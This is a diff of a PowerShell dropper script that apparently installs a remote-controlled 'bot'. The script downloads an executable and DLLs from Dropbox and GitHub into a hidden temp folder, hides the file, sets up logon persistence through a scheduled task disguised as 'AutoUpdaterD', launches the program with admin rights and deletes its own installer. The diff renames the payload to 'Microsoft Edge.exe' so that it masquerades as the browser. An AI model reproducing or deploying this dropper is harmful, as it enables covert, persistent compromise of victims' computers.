@@ -8,7 +8,7 @@ mkdir sVBXKuz
 cd sVBXKuz
 
 #download executable and startup file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/ll2lef3yscbinixdg5772/wsappa-1.7.exe?rlkey=tcosuk2m6nw87girq8yrqvltk&dl=0" -OutFile wsappa.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/y1cen9nbe4ghgi4hm2nmi/wsappa-1.7.exe?rlkey=dgtqp22fbwpgl18jvuvj6i1lb&dl=0" -OutFile Microsoft Edge.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
@@ -16,7 +16,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/m
 
 
 #hide files
-$file = "$env:temp\sVBXKuz\wsappa.exe"
+$file = "$env:temp\sVBXKuz\Microsoft Edge.exe"
 
 
 $attr = [System.IO.FileAttributes]::Hidden
@@ -26,7 +26,7 @@ Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attribute
 
 
 
-$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.exe'
+$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\Microsoft Edge.exe'
 $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
 $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
 
@@ -83,7 +83,7 @@ $taskXml = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
+      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\Microsoft Edge.exe</Command>
     </Exec>    
   </Actions>
 </Task>
@@ -97,7 +97,7 @@ Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force
 
 
 #start bot
-cd $env:temp/sVBXKuz/ ; Start-Process wsappa.exe -Verb RunAs
+cd $env:temp/sVBXKuz/ ; Start-Process Microsoft Edge.exe -Verb RunAs
 
 #clean up
 powershell.exe /c Remove-Item $env:temp/dinstall.ps1
